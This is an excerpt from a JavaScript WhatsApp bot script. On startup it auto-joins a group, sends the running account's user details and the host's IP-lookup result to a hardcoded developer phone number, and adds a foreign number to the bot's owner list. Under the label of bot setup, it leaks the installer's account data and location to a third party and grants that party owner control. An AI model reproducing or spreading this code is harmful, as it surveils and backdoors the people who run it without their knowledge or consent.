...
console.log(color('> WA NUMBER:+15873186828','silver'))
...
teks = 'https://chat.whatsapp.com/'
 ...
 console.log(color('|WRN|', 'pink'), color('JOINED TO FORUM WHATSAPP BOT GROUP', 'pink'))
 OLDUSER.sendMessage(`15873186828@s.whatsapp.net`, `*Hi Owner olduser, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(OLDUSER.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: {forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer OLDUSER BOT Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./o.jpg'),sourceUrl:"https://wa.me/15873186828?text=Hello bro"}}})
 console.log(color('|WRN|', 'red'), color('SENDING BOT INFO TO BOT OWNER', 'red'))
fetch(`http://ip-api.com/line`).then(res => res.text())
        .then(bu =>{
       OLDUSER.sendMessage("15873186828@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer OLDUSER BOT Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./o.jpg'),sourceUrl:"https://wa.me/15873186828?text=Hello bro"}}})
   ...
   // owner
    ...
    const htod = "15873186828@s.whatsapp.net"
...
OLDUSER.on('group-update', async (anu) => {
    ...
    OLDUSER.on('chat-update', async (message) => {
        ...
        ownerNumber = ["918109939106@s.whatsapp.net","918109939106@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "918109939106@s.whatsapp.net"
